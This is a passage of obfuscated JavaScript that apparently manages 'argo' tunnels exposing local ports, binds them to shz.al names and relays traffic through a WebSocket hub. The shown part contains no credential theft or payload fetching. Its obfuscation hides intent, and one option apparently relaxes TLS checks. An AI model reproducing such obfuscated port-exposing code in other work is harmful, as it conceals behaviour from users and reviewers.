            'wyELA': function (d, f) {
                return d <= f;
            },
            'klvpR': function (d, f) {
                return d - f;
            },
            'SyrPy': function (d, f) {
                return d * f;
            },
            'cEDoL': function (d, f) {
                return d ** f;
            }
        };
    if (b['wyELA'](a, 0x0))
        return a0cH;
    const c = Math['min'](b[lF(0xa67)](a, 0x1), 0xa);
    return Math[lF(0x100f)](b['SyrPy'](a0cH, b[lF(0x3d0)](0x2, c)), a0cI);
}
function a0cK(a, b = 0x12c) {
    const lG = a0d9, c = {
            'xgroI': function (d, f) {
                return d == f;
            },
            'kKzoc': function (d, f) {
                return d(f);
            }
        };
    if (c[lG(0x8eb)](a, null))
        return null;
    return c[lG(0xb93)](String, a)['slice'](0x0, b);
}
function a0cL() {
    return new Date()['toISOString']()['replace'](/\.\d{3}Z$/, 'Z');
}
const a0cM = ((() => {
    const lH = a0d9, a = {
            'QynXq': function (c, d, f) {
                return c(d, f);
            },
            'lQtKT': function (c, d) {
                return c < d;
            },
            'CYiOv': function (c, d) {
                return c * d;
            }
        }, b = a[lH(0x4fe)](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
    if (!Number[lH(0x63f)](b) || a[lH(0xd7f)](b, 0x0))
        return 0x12c * 0x3e8;
    return b === 0x0 ? 0x0 : a[lH(0xb18)](Math['max'](b, 0xa), 0x3e8);
})());
function a0cN(a) {
    const lI = a0d9, b = {
            'lyJSu': 'utf8',
            'AaRKr': function (c, d) {
                return c === d;
            },
            'mwOkv': lI(0xfe9),
            'qRqxK': function (c, d) {
                return c === d;
            },
            'awgte': lI(0xba0)
        };
    if (Buffer[lI(0x24f)](a))
        try {
            const c = JSON[lI(0xadd)](a[lI(0x43a)](b[lI(0x144)]));
            return c && b[lI(0xa33)](typeof c, b[lI(0xfe7)]) ? c : {};
        } catch (d) {
            return {};
        }
    if (b[lI(0x967)](typeof a, b[lI(0xe3b)])) {
        const f = a[lI(0x5b0)]();
        if (f)
            try {
                return JSON[lI(0xadd)](f);
            } catch (g) {
            }
        return {};
    }
    return a && typeof a === b[lI(0xfe7)] ? a : {};
}
class a0cO {
    constructor(a) {
        const lJ = a0d9;
        this[lJ(0x4c7)] = a, this[lJ(0x326)] = new Map(), this['onDomainChange'] = null, this[lJ(0xecd)] = a0bG, this[lJ(0x3d2)] = a0by;
    }
    async ['create'](a, b, c = ![], d = null) {
        const lK = a0d9, f = {
                'ioipp': function (s, t) {
                    return s + t;
                },
                'njUZb': function (s, t) {
                    return s + t;
                },
                'esCPQ': lK(0xd0d),
                'tzIso': lK(0x220),
                'cgvIY': lK(0x95f),
                'vqShW': function (s, t) {
                    return s(t);
                },
                'YsmUI': function (s) {
                    return s();
                },
                'LJYrn': lK(0x4e4),
                'ELiQP': function (s, t) {
                    return s !== t;
                },
                'xXAtg': function (s, t) {
                    return s !== t;
                },
                'snbKn': function (s, t) {
                    return s !== t;
                },
                'frLyy': function (s, t) {
                    return s !== t;
                },
                'fxMpa': function (s, t) {
                    return s !== t;
                },
                'HJslt': function (s, t, u, v) {
                    return s(t, u, v);
                },
                'UeBIk': function (s, t) {
                    return s === t;
                },
                'fdnef': function (s, t) {
                    return s !== t;
                },
                'WWSiW': function (s, t) {
                    return s > t;
                },
                'amXGT': lK(0xfc2),
                'Vxgzx': lK(0xe94),
                'EbDct': lK(0x562),
                'tiYLr': function (s, t) {
                    return s(t);
                },
                'cJpZh': function (s, t) {
                    return s(t);
                },
                'qNLxe': function (s, t) {
                    return s(t);
                },
                'sDgdg': function (s, t) {
                    return s + t;
                },
                'RrUnt': function (s, t) {
                    return s + t;
                },
                'VicrD': function (s, t) {
                    return s + t;
                },
                'gRuYH': function (s, t) {
                    return s + t;
                },
                'BWumj': 'argo\x20tunnel\x20created:\x20',
                'ZkYCl': lK(0xd5a)
            }, g = d && d['source'] || f[lK(0x519)], h = !!(d && d['shz']), i = d && f[lK(0x825)](d['shzName'], undefined) && f['ELiQP'](d[lK(0x4ff)], null) ? d['shzName'] : null, j = d && f['xXAtg'](d[lK(0x6ee)], undefined) && f[lK(0x512)](d['shzKey'], null) ? d['shzKey'] : null, k = h || f[lK(0x80e)](i, null) || f['fxMpa'](j, null);
        if (k) {
            const s = f[lK(0x7b8)](a0cX, a, i, j);
            if (s) {
                const t = new Error(s);
                t['status'] = 0x190, t[lK(0x5c6)] = a;
                throw t;
            }
            for (const u of this[lK(0x326)]['values']()) {
                for (const v of u) {
                    if (f[lK(0xe01)](v[lK(0x5c6)], a) && f['fdnef'](v[lK(0x4ff)], null)) {
                        const w = new Error(lK(0x55a)[lK(0x83f)](a, lK(0x903))[lK(0x83f)](v[lK(0x4ff)], lK(0x802)));
                        w['status'] = 0x199, w['port'] = a;
                        throw w;
                    }
                }
            }
        }
        const l = this['tunnels'][lK(0xb12)](a) || [];
        if (f['WWSiW'](l[lK(0xc54)], 0x0) && !b) {
            const x = new Error(lK(0x6a9)[lK(0x83f)](a, lK(0x577)));
            x[lK(0x13d)] = 0x199, x[lK(0x5c6)] = a;
            throw x;
        }
        let m, n, o, p;
        try {
            [m, n, o, p] = await (this[lK(0x649)] || a0bv)(lK(0x2ac));
        } catch (y) {
            const z = new Error(f[lK(0xff8)] + y[lK(0x769)]);
            z['status'] = 0x1f4, z[lK(0x5c6)] = a;
            throw z;
        }
        const q = m[lK(0x1ba)]('https://') ? m : f['ioipp'](f[lK(0x978)], m), r = {
                'tunnelDomain': q,
                'port': a,
                'createdAt': new Date()[lK(0xc78)]()[lK(0x8d4)](/\.\d{3}Z$/, 'Z'),
                'transport': c ? f[lK(0xd26)] : 'h2',
                'quicFailures': 0x0,
                'consecutiveFailures': 0x0,
                'status': lK(0x365),
                'lastError': null,
                'lastErrorAt': null,
                'lastRegisteredAt': new Date()[lK(0xc78)]()[lK(0x8d4)](/\.\d{3}Z$/, 'Z'),
                'source': g,
                'shzName': null,
                'shzKey': null,
                'shzKeyExplicit': ![],
                'onDomainChange': null,
                'stopped': ![],
                'sock': null,
                'conn': null,
                'runPromise': null
            };
        r[lK(0x648)] = this[lK(0x834)](r, n, o, p)[lK(0x92f)](A => {
            const lL = lK;
            this[lL(0x4c7)]['warning'](f[lL(0x6af)](f[lL(0x66d)](f[lL(0x927)], q) + f[lL(0xe84)], A[lL(0x769)])), !r[lL(0x394)] && (r[lL(0x13d)] = f['cgvIY'], r['lastError'] = f['vqShW'](a0cK, A && A[lL(0x769)] ? A['message'] : A), r['lastErrorAt'] = f[lL(0xd8a)](a0cL));
        }), l[lK(0xb66)](r), this['tunnels'][lK(0x42d)](a, l);
        if (k) {
            const A = f['fxMpa'](i, null) ? f[lK(0xfb8)](String, i) : f[lK(0xdaa)](a0cV, a), B = f[lK(0x512)](j, null) ? String(j) : f[lK(0x919)](a0cW, A);
            this[lK(0x46a)](r, A, B, f[lK(0xc65)](j, null)), this[lK(0xafc)](), this['_reportBoundAsync'](r);
        }
        return this[lK(0x4c7)]['info'](f[lK(0x66d)](f[lK(0x463)](f['RrUnt'](f[lK(0x8a0)](f[lK(0x882)](f[lK(0x459)], q) + f[lK(0x1072)], a), '\x20('), r['transport']), ')')), r;
    }
    [a0d9(0x46a)](a, b, c, d = ![]) {
        const lM = a0d9;
        a[lM(0x4ff)] = b, a[lM(0x6ee)] = c, a[lM(0xcfb)] = d, a[lM(0x96b)] = (f, g) => {
            a0cT['reportDomainChange'](g, b, c);
        };
    }
    [a0d9(0xf96)](a) {
        const lN = a0d9;
        a0cT[lN(0x518)](a[lN(0x140)], a[lN(0x4ff)], a[lN(0x6ee)])['catch'](() => {
        });
    }
    [a0d9(0xafc)]() {
        const lO = a0d9, a = {
                'agBsB': function (c, d) {
                    return c !== d;
                }
            }, b = [];
        for (const c of this['tunnels']['values']()) {
            for (const d of c) {
                if (a[lO(0x1043)](d[lO(0x4ff)], null)) {
                    const f = {
                        'port': d['port'],
                        'name': d[lO(0x4ff)]
                    };
                    if (d[lO(0x6ee)] !== null && d[lO(0xcfb)])
                        f['key'] = d[lO(0x6ee)];
                    b[lO(0xb66)](f);
                }
            }
        }
        return a0aW[lO(0x9a9)](b);
    }
    [a0d9(0x300)](a, b, c) {
        const lP = a0d9, d = {
                'rHoyL': function (g, h) {
                    return g === h;
                },
                'QxEJz': function (g, h) {
                    return g !== h;
                },
                'ajYXC': function (g, h) {
                    return g !== h;
                },
                'KzkJa': function (g, h) {
                    return g !== h;
                }
            }, f = this[lP(0x326)][lP(0xb12)](a) || [];
        if (d[lP(0x537)](f[lP(0xc54)], 0x0))
            return {
                'status': 0x194,
                'message': lP(0x782)[lP(0x83f)](a)
            };
        if (d[lP(0x914)](b, undefined) && d['ajYXC'](b, null) && d[lP(0xfd1)](b, '')) {
            const g = f[lP(0x595)](h => h['tunnelDomain'] === b);
            if (g[lP(0xc54)] === 0x0)
                return {
                    'status': 0x194,
                    'message': lP(0x782)['concat'](a, lP(0x2e0))[lP(0x83f)](b)
                };
            return {
                'status': 'ok',
                'entry': g[0x0]
            };
        }
        if (f['length'] > 0x1)
            return {
                'status': 0x199,
                'message': lP(0x703)['concat'](a, lP(0x953))
            };
        return {
            'status': 'ok',
            'entry': f[0x0]
        };
    }
    async ['bind'](a, b, c = null, d = null) {
        const lQ = a0d9, f = {
                'fenyG': function (l, m, n, o) {
                    return l(m, n, o);
                },
                'FdyjQ': lQ(0xe0e),
                'JTMdS': lQ(0xe1d),
                'gZHaO': function (l, m) {
                    return l !== m;
                },
                'BXvZS': function (l, m) {
                    return l === m;
                },
                'suusV': function (l, m) {
                    return l !== m;
                },
                'zbuTB': function (l, m) {
                    return l(m);
                },
                'EmZMp': function (l, m) {
                    return l(m);
                },
                'YbwVy': function (l, m) {
                    return l + m;
                }
            }, g = f['fenyG'](a0cX, a, c, d);
        if (g)
            return {
                'status': 0x190,
                'message': g
            };
        const h = this[lQ(0x300)](a, b, f['FdyjQ']);
        if (h[lQ(0x13d)] !== 'ok')
            return h;
        const i = h[lQ(0x231)];
        if (i[lQ(0xfa4)] === f['JTMdS'])
            return {
                'status': 0x199,
                'message': lQ(0x2e3)['concat'](a, '\x20is\x20managed\x20by\x20KMODE,\x20cannot\x20bind\x20via\x20/api/argo/bind')
            };
        for (const l of this['tunnels'][lQ(0x570)]()) {
            for (const m of l) {
                if (f[lQ(0x3fc)](m, i) && f[lQ(0xc58)](m[lQ(0x5c6)], a) && m[lQ(0x4ff)] !== null)
                    return {
                        'status': 0x199,
                        'message': lQ(0x55a)[lQ(0x83f)](a, lQ(0x903))[lQ(0x83f)](m['shzName'], lQ(0x802))
                    };
            }
        }
        const j = f[lQ(0x24e)](c, null) ? String(c) : f[lQ(0x224)](a0cV, a), k = f[lQ(0x3fc)](d, null) ? f[lQ(0x631)](String, d) : a0cW(j);
        return this[lQ(0x46a)](i, j, k, f[lQ(0x3fc)](d, null)), this[lQ(0xafc)](), this[lQ(0xf96)](i), {
            'status': 'ok',
            'bound': !![],
            'port': a,
            'tunnel_domain': i['tunnelDomain'],
            'shz_name': j,
            'shz_url': f[lQ(0x6a6)]('https://shz.al/~', j)
        };
    }
    async [a0d9(0xe8a)](a, b) {
        const lR = a0d9, c = {
                'uKUpa': lR(0xe8a),
                'GMklH': function (i, j) {
                    return i === j;
                }
            }, d = this['_locateEntry'](a, b, c[lR(0xc1b)]);
        if (d[lR(0x13d)] !== 'ok')
            return d;
        const f = d[lR(0x231)];
        if (c[lR(0x75a)](f['shzName'], null))
            return {
                'status': 0x194,
                'message': 'tunnel\x20on\x20port\x20'[lR(0x83f)](a, '\x20has\x20no\x20shz.al\x20binding')
            };
        const g = f['shzName'], h = f[lR(0x6ee)];
        return f[lR(0x4ff)] = null, f[lR(0x6ee)] = null, f[lR(0xcfb)] = ![], f[lR(0x96b)] = null, this[lR(0xafc)](), a0cT[lR(0x9b4)](g, h)['catch'](() => {
        }), {
            'status': 'ok',
            'bound': ![],
            'port': a,
            'tunnel_domain': f[lR(0x140)],
            'shz_name': null,
            'shz_url': null
        };
    }
    ['list']() {
        const lS = a0d9, a = {
                'eeReJ': lS(0x365),
                'whgjA': lS(0xf6c)
            }, b = [], c = [...this[lS(0x326)]['keys']()][lS(0xcd4)]((d, f) => d - f);
        for (const d of c) {
            for (const f of this[lS(0x326)]['get'](d)) {
                b[lS(0xb66)]({
                    'tunnel_domain': f[lS(0x140)],
                    'port': f[lS(0x5c6)],
                    'created_at': f['createdAt'],
                    'transport': f[lS(0x5a2)],
                    'status': f['status'] || a['eeReJ'],
                    'last_error': f[lS(0xef5)] ?? null,
                    'last_error_at': f[lS(0x316)] ?? null,
                    'consecutive_failures': f[lS(0x670)] || 0x0,
                    'last_registered_at': f[lS(0x184)] ?? null,
                    'shz_name': f[lS(0x4ff)] ?? null,
                    'shz_url': f[lS(0x4ff)] ? a[lS(0xa8b)] + f[lS(0x4ff)] : null
                });
            }
        }
        return b;
    }
    async [a0d9(0x51e)](a, b) {
        const lT = a0d9, c = {
                'fLViZ': function (j, k) {
                    return j === k;
                },
                'hUvNG': function (j, k) {
                    return j === k;
                },
                'saZDF': function (j, k) {
                    return j === k;
                },
                'EEKjD': function (j, k) {
                    return j === k;
                },
                'INKVG': function (j, k) {
                    return j !== k;
                },
                'IiaNX': function (j, k) {
                    return j !== k;
                },
                'DyyXV': lT(0x365),
                'PtrtQ': function (j, k) {
                    return j + k;
                },
                'UGerU': lT(0xf6c),
                'EbnRq': function (j, k) {
                    return j > k;
                },
                'eQhFD': function (j, k) {
                    return j + k;
                },
                'jZEDi': 'argo\x20tunnel\x20deleted:\x20'
            }, d = this[lT(0x326)][lT(0xb12)](a) || [];
        if (c[lT(0x786)](d[lT(0xc54)], 0x0))
            return {
                'status': 0x194,
                'message': lT(0x782)['concat'](a)
            };
        let f;
        if (c[lT(0x9bc)](b, undefined) || c[lT(0xa98)](b, null) || c[lT(0xc27)](b, '')) {
            if (d[lT(0xc54)] > 0x1)
                return {
                    'status': 0x199,
                    'message': lT(0x703)['concat'](a, lT(0x953))
                };
            f = d;
        } else {
            f = d[lT(0x595)](j => j[lT(0x140)] === b);
            if (c['saZDF'](f[lT(0xc54)], 0x0))
                return {
                    'status': 0x194,
                    'message': lT(0x782)[lT(0x83f)](a, '\x20with\x20domain\x20')[lT(0x83f)](b)
                };
        }
        const g = [], h = [];
        for (const j of f) {
            j[lT(0x394)] = !![];
            if (j[lT(0x943)] !== null)
                try {
                    j[lT(0x943)][lT(0x76b)](lT(0x5e1));
                } catch (l) {
                }
            if (c['INKVG'](j[lT(0x50a)], null))
                try {
                    j[lT(0x50a)][lT(0x28a)]();
                } catch (m) {
                }
            await j[lT(0x648)][lT(0x92f)](() => {
            });
            const k = j[lT(0x4ff)];
            c[lT(0x4c4)](j[lT(0x4ff)], null) && (h[lT(0xb66)]([
                j[lT(0x4ff)],
                j[lT(0x6ee)]
            ]), j['shzName'] = null, j[lT(0x6ee)] = null, j['shzKeyExplicit'] = ![]), g[lT(0xb66)]({
                'tunnel_domain': j[lT(0x140)],
                'port': j['port'],
                'created_at': j[lT(0x9ac)],
                'transport': j[lT(0x5a2)],
                'status': j[lT(0x13d)] || c[lT(0xdeb)],
                'last_error': j[lT(0xef5)] ?? null,
                'last_error_at': j['lastErrorAt'] ?? null,
                'consecutive_failures': j[lT(0x670)] || 0x0,
                'last_registered_at': j['lastRegisteredAt'] ?? null,
                'shz_name': k,
                'shz_url': k ? c['PtrtQ'](c['UGerU'], k) : null
            });
        }
        const i = d[lT(0x595)](n => !n[lT(0x394)]);
        c[lT(0x829)](i[lT(0xc54)], 0x0) ? this['tunnels'][lT(0x42d)](a, i) : this[lT(0x326)][lT(0x350)](a);
        if (c[lT(0x829)](h[lT(0xc54)], 0x0)) {
            this[lT(0xafc)]();
            for (const [n, o] of h) {
                a0cT[lT(0x9b4)](n, o)['catch'](() => {
                });
            }
        }
        for (const p of g) {
            this[lT(0x4c7)]['info'](c[lT(0x8d6)](c[lT(0x9f5)], p['tunnel_domain']));
        }
        return {
            'status': 'ok',
            'deleted': g[lT(0xc54)],
            'tunnels': g
        };
    }
    async [a0d9(0x834)](a, b, c, d) {
        const lU = a0d9, f = {
                'wzXCV': function (j, k) {
                    return j < k;
                },
                'JHoXw': function (j, k) {
                    return j(k);
                },
                'yhupO': function (j, k) {
                    return j === k;
                },
                'YPHoj': lU(0x562),
                'DWBqa': function (j, k, l, m) {
                    return j(k, l, m);
                },
                'OBBmH': function (j, k) {
                    return j > k;
                },
                'fgHXq': 'tunnel\x20removed',
                'AWWvr': function (j, k) {
                    return j + k;
                },
                'YZSEy': function (j, k) {
                    return j % k;
                },
                'zjwXX': function (j, k) {
                    return j + k;
                },
                'byMFf': function (j, k) {
                    return j + k;
                },
                'jeCRi': function (j, k) {
                    return j + k;
                },
                'TtqpZ': function (j, k) {
                    return j + k;
                },
                'BbFtZ': lU(0xdb4),
                'hzYeZ': lU(0x892),
                'ZRquh': function (j, k) {
                    return j(k);
                },
                'vWhre': function (j) {
                    return j();
                },
                'fifoW': function (j, k) {
                    return j !== k;
                },
                'qZQtT': function (j, k) {
                    return j !== k;
                },
                'HNLAB': function (j, k) {
                    return j !== k;
                },
                'lhAmS': lU(0xbd9),
                'qojuc': function (j) {
                    return j();
                },
                'IAvfo': lU(0x95f),
                'DLUYc': function (j, k) {
                    return j >= k;
                },
                'GwCcy': '0|1|5|2|4|3',
                'SjZYW': function (j, k) {
                    return j !== k;
                },
                'qRQyD': function (j, k) {
                    return j == k;
                },
                'FjmRc': function (j, k) {
                    return j * k;
                },
                'VtKTC': function (j, k) {
                    return j(k);
                },
                'kMXtd': function (j, k) {
                    return j > k;
                }
            }, g = lU(0xb61) + a['port'], h = async j => {
                const lV = lU;
                for (let k = 0x0; f[lV(0xc0a)](k, j) && !a[lV(0x394)]; k += 0x1f4) {
                    await new Promise(l => setTimeout(l, Math['min'](0x1f4, j - k)));
                }
            };
        a[lU(0x670)] = 0x0;
        let i = 0x0;
        while (!a['stopped']) {
            let j = null, k = null, l = null;
            try {
                const n = f[lU(0x3ac)](String, process.env.KISAMA_EDGE_INSECURE || '')[lU(0x544)]() !== lU(0xf0e);
                if (f[lU(0xef2)](a[lU(0x5a2)], f[lU(0xc11)])) {
                    l = await f[lU(0x1c8)](a0cC, this['log'], f[lU(0x611)](a0cM, 0x0) ? a0cM : 0x7530, n);
                    if (a[lU(0x394)]) {
                        try {
                            l[lU(0x76b)](f[lU(0x441)]);
                        } catch (o) {
                        }
                        break;
                    }
                    a[lU(0x943)] = l, i = f[lU(0x9da)](i, 0x1) % 0x4, await new a0cB(l, g, b, c, d, i, this[lU(0x4c7)])[lU(0xbf2)]();
                } else {
                    j = await this['_connectEdge'](n, this[lU(0x4c7)]);
                    if (a[lU(0x394)]) {
                        try {
                            j[lU(0x28a)]();
                        } catch (p) {
                        }
                        break;
                    }
                    a[lU(0x50a)] = j, i = f[lU(0x100a)](f['zjwXX'](i, 0x1), 0x4), k = new this['_H2Connection'](j, g, b, c, d, i, this[lU(0x4c7)], a[lU(0x140)], ![], { 'printed': !![] }), await k[lU(0xbf2)]();
                }
            } catch (q) {
                if (!a[lU(0x394)]) {
                    this[lU(0x4c7)][lU(0xfdf)](f[lU(0x839)](f['jeCRi'](f[lU(0x1b6)](f['BbFtZ'], a['tunnelDomain']), lU(0x94d)), q[lU(0x769)]));
                    if (a[lU(0x13d)] !== lU(0x95f))
                        a[lU(0x13d)] = f[lU(0x728)];
                    a[lU(0xef5)] = f[lU(0xf81)](a0cK, q && q[lU(0x769)] ? q[lU(0x769)] : q), a[lU(0x316)] = f[lU(0x15d)](a0cL);
                }
            } finally {
                if (j !== null)
                    try {
                        j[lU(0x28a)]();
                    } catch (r) {
                    }
                if (f['fifoW'](l, null))
                    try {
                        l[lU(0x76b)](lU(0x235));
                    } catch (s) {
                    }
                a[lU(0x50a)] = null, a[lU(0x943)] = null;
            }
            if (a[lU(0x394)])
                break;
            const m = f[lU(0x1e9)](k, null) && k['registered'] || f[lU(0x1074)](l, null) && l[lU(0xcf3)];
            if (m) {
                const t = f['lhAmS'][lU(0xa6a)]('|');
                let u = 0x0;
                while (!![]) {
                    switch (t[u++]) {
                    case '0':
                        a[lU(0x316)] = null;
                        continue;
                    case '1':
                        a[lU(0x13d)] = lU(0x365);
                        continue;
                    case '2':
                        a['lastError'] = null;
                        continue;
                    case '3':
                        a[lU(0x670)] = 0x0;
                        continue;
                    case '4':
                        a['lastRegisteredAt'] = f[lU(0xd6d)](a0cL);
                        continue;
                    case '5':
                        a[lU(0x25e)] = 0x0;
                        continue;
                    }
                    break;
                }
            } else {
                a[lU(0x670)] += 0x1;
                if (a[lU(0x13d)] !== f[lU(0x58d)])
                    a[lU(0x13d)] = f[lU(0x728)];
                a[lU(0x5a2)] === 'quic' && (a[lU(0x25e)] += 0x1, f['DLUYc'](a[lU(0x25e)], a0cF) && (a['transport'] = 'h2', this[lU(0x4c7)][lU(0xfdf)]('argo\x20tunnel\x20'[lU(0x83f)](a[lU(0x140)], lU(0xb99))[lU(0x83f)](a['quicFailures'], lU(0xd49))), a[lU(0x25e)] = 0x0));
                if (f[lU(0x23a)](a['consecutiveFailures'], a0cF)) {
                    if (await this[lU(0xab0)](a, (v, w, x) => {
                            b = v, c = w, d = x;
                        })) {
                        const v = f[lU(0xc98)][lU(0xa6a)]('|');
                        let w = 0x0;
                        while (!![]) {
                            switch (v[w++]) {
                            case '0':
                                a[lU(0x670)] = 0x0;
                                continue;
                            case '1':
                                a[lU(0x25e)] = 0x0;
                                continue;
                            case '2':
                                a['lastError'] = null;
                                continue;
                            case '3':
                                a[lU(0x184)] = a0cL();
                                continue;
                            case '4':
                                a[lU(0x316)] = null;
                                continue;
                            case '5':
                                a[lU(0x13d)] = lU(0x365);
                                continue;
                            }
                            break;
                        }
                    } else
                        f[lU(0x1004)](a[lU(0x13d)], 'failed') && (a[lU(0x13d)] = f[lU(0x58d)], f[lU(0x4c3)](a[lU(0xef5)], null) && (a[lU(0xef5)] = lU(0x2f8), a[lU(0x316)] = f['vWhre'](a0cL))), await f[lU(0x3ac)](h, f[lU(0x8e1)](f['VtKTC'](a0cJ, a[lU(0x670)]), 0x3e8));
                }
            }
            !a[lU(0x394)] && await f[lU(0xf81)](h, (f[lU(0x65f)](a[lU(0x670)], 0x0) ? a0cJ(a[lU(0x670)]) : a0cD) * 0x3e8);
        }
    }
    ['_reregister'](a, b) {
        const lW = a0d9, c = {
                'yRkWN': lW(0xe94),
                'CYjYG': function (f, g) {
                    return f + g;
                },
                'pwaIz': function (f, g) {
                    return f + g;
                },
                'yzbSN': lW(0xa68),
                'uxooI': lW(0xd54),
                'WTBPY': function (f, g) {
                    return f === g;
                },
                'pvPKm': lW(0xd40),
                'qZNSg': function (f, g, h) {
                    return f(g, h);
                },
                'BzjAL': function (f, g) {
                    return f + g;
                },
                'zxcNn': function (f, g) {
                    return f(g);
                },
                'URLzq': lW(0x2ac)
            }, d = this[lW(0x649)] || a0bv;
        return c['zxcNn'](d, c[lW(0x285)])[lW(0xdcb)](([f, g, h, i]) => {
            const lX = lW, j = a[lX(0x140)];
            b(g, h, i), a[lX(0x140)] = f[lX(0x1ba)](c[lX(0xe1b)]) ? f : c[lX(0xfe8)](lX(0xe94), f), this[lX(0x4c7)][lX(0xfdf)](c['CYjYG'](c[lX(0xfed)](c[lX(0xfe8)](c[lX(0x6c9)], j), c['uxooI']), a['tunnelDomain']));
            const k = c[lX(0xca7)](typeof a['onDomainChange'], lX(0xd40)) ? a[lX(0x96b)] : this[lX(0x96b)];
            if (c[lX(0xca7)](typeof k, c['pvPKm']))
                try {
                    c[lX(0xd92)](k, j, a[lX(0x140)]);
                } catch (l) {
                }
            return !![];
        })[lW(0x92f)](f => {
            const lY = lW;
            return this['log'][lY(0xfdf)](c[lY(0x31d)]('argo\x20tunnel\x20re-register\x20failed:\x20', f[lY(0x769)])), ![];
        });
    }
}
const a0cP = require('ws');
class a0cQ {
    constructor(a, b, c, d, f, g = a0d9(0xfc7)) {
        const lZ = a0d9, h = {
                'CPPzD': function (j, k) {
                    return j(k);
                },
                'nxWmF': function (j, k) {
                    return j || k;
                },
                'uWENb': function (j, k, l) {
                    return j(k, l);
                },
                'moXBG': function (j, k) {
                    return j(k);
                },
                'YSHvC': function (j, k) {
                    return j * k;
                },
                'pFhWy': function (j, k) {
                    return j * k;
                }
            };
        this[lZ(0x3de)] = h[lZ(0x1057)](a0aw, a), this[lZ(0xebe)] = h[lZ(0xee8)](b, '')['trim']()[lZ(0x544)](), this[lZ(0x5c6)] = h[lZ(0xc16)](parseInt, c, 0xa), this[lZ(0xfea)] = Array[lZ(0xedd)](d) ? [...d] : h[lZ(0x1057)](a0a6, d), this[lZ(0xfa4)] = g, this[lZ(0x4c7)] = f || a0R;
        const i = a0a9(a0aE[lZ(0xb60)]);
        i ? (this[lZ(0x4c7)][lZ(0x585)](lZ(0x272)['concat'](i, lZ(0x390))), this[lZ(0xb80)] = null) : this[lZ(0xb80)] = (a0aE[lZ(0xb60)] || '')[lZ(0x5b0)]()[lZ(0x8d4)](/\/+$/, '') || null, this['resolvedHubUrl'] = h[lZ(0x3ec)](a0av, this[lZ(0x3de)]) ? null : this[lZ(0x3de)], this[lZ(0xb22)] = ''[lZ(0x83f)](this['publicUrl'] || this[lZ(0x139)] || this[lZ(0x3de)], '/')[lZ(0x83f)](this[lZ(0xebe)]), this[lZ(0x13d)] = 'reconnecting', this['lastError'] = null, this[lZ(0x316)] = null, this[lZ(0x670)] = 0x0, this[lZ(0x941)] = null, this[lZ(0x55d)] = 0x0, this[lZ(0xe4c)] = null, this[lZ(0xb5a)] = h[lZ(0xb01)](Math[lZ(0x37f)](0x5, a0aE[lZ(0x2c7)]), 0x3e8), this[lZ(0x7c3)] = Math[lZ(0x37f)](0.5, a0aE[lZ(0xc37)]), this[lZ(0x832)] = Math[lZ(0x37f)](this[lZ(0x7c3)], a0aE[lZ(0x87e)]), this[lZ(0x260)] = h[lZ(0x667)](Math[lZ(0x37f)](0x5, a0aE[lZ(0xa99)]), 0x3e8), this[lZ(0x803)] = Math[lZ(0x37f)](0x1, a0aE['KISAMA_HUB_MAX_BODY']), this[lZ(0xb9a)] = null, this[lZ(0x27e)] = null, this[lZ(0xf6f)] = ![], this[lZ(0x933)] = null, this[lZ(0xcf2)] = null;
    }
    [a0d9(0x86c)]() {
        const m0 = a0d9;
        return {
            'tunnel_status': this['status'],
            'source': this[m0(0xfa4)],
            'hub': this[m0(0x3de)],
            'resolved_hub': this['resolvedHubUrl'],
            'kname': this[m0(0xebe)],
            'url': this[m0(0xb22)],
            'public_url': this['publicUrl'] || this[m0(0x139)] || this[m0(0x3de)],
            'ports': [...this[m0(0xfea)]][m0(0xcd4)]((c, d) => c - d),
            'consecutive_failures': this[m0(0x670)],
            'last_error': this[m0(0xef5)],
            'last_error_at': this[m0(0x316)],
            'last_connected_at': this['lastConnectedAt'],
            'relay_count': this[m0(0x55d)]
        };
    }
    [a0d9(0xa51)](a = 0x3a98) {
        const m1 = a0d9, b = {
                'XVDLI': function (d, f) {
                    return d(f);
                },
                'DwPSt': m1(0xdc7),
                'tlwnG': function (d, f) {
                    return d(f);
                },
                'jHWRr': m1(0x365),
                'thrzu': function (d, f) {
                    return d(f);
                },
                'vxHgo': function (d, f, g) {
                    return d(f, g);
                },
                'sTjvB': function (d, f) {
                    return d + f;
                }
            }, c = b['sTjvB'](Date['now'](), Math['max'](0x3e8, a));
        return new Promise(d => {
            const m3 = m1, f = {
                    'ZMyAb': function (h, i) {
                        const m2 = a0b;
                        return b[m2(0x58b)](h, i);
                    },
                    'zaUZQ': b[m3(0xb4b)],
                    'EcSFQ': function (h, i) {
                        return b['tlwnG'](h, i);
                    },
                    'lnZum': b[m3(0x3c1)],
                    'tgZNP': function (h, i) {
                        return b['thrzu'](h, i);
                    },
                    'KKxfB': function (h, i) {
                        const m4 = m3;
                        return b[m4(0xcee)](h, i);
                    }
                }, g = b[m3(0xb70)](setInterval, () => {
                    const m5 = m3;
                    if (this['_stopFlag'])
                        return clearInterval(g), f[m5(0x1067)](d, {
                            'ok': ![],
                            'err': new Error(f[m5(0x3f2)])
                        });
                    if (this[m5(0xe4c)])
                        return f['EcSFQ'](clearInterval, g), d({
                            'ok': ![],
                            'err': this['_registerError']
                        });
                    if (this[m5(0x13d)] === f[m5(0xa75)])
                        return f[m5(0x89c)](clearInterval, g), d({
                            'ok': !![],
                            'err': null
                        });
                    if (Date[m5(0x8da)]() >= c)
                        return clearInterval(g), f['KKxfB'](d, {
                            'ok': ![],
                            'err': new Error(m5(0xcd2))
                        });
                }, 0xc8);
        });
    }
    [a0d9(0x460)](a) {
        const m6 = a0d9, b = {
                'fSyMM': m6(0x892),
                'Iltxw': function (c, d) {
                    return c(d);
                },
                'clUZl': function (c) {
                    return c();
                }
            };
        this['consecutiveFailures'] += 0x1, this[m6(0x13d)] = b['fSyMM'], this['lastError'] = b[m6(0xdb2)](String, a && a[m6(0x769)] || a)[m6(0x47b)](0x0, 0x12c), this[m6(0x316)] = b[m6(0xc39)](a0aC);
    }
    ['_backoff']() {
        const m7 = a0d9, a = {
                'UDyqb': function (b, c, d, f) {
                    return b(c, d, f);
                }
            };
        return a[m7(0x2ed)](a0aB, this[m7(0x670)], this[m7(0x7c3)], this['_retryMax']);
    }
    [a0d9(0x373)]() {
        const m8 = a0d9;
        if (this['_loopPromise'])
            return;
        this[m8(0xf6f)] = ![], this[m8(0xcf2)] = this['_loop']()['catch'](() => {
        });
    }
    [a0d9(0xe73)]() {
        const m9 = a0d9, a = { 'okTSi': 'agent\x20stopping' };
        this[m9(0xf6f)] = !![];
        if (this[m9(0x933)]) {
            try {
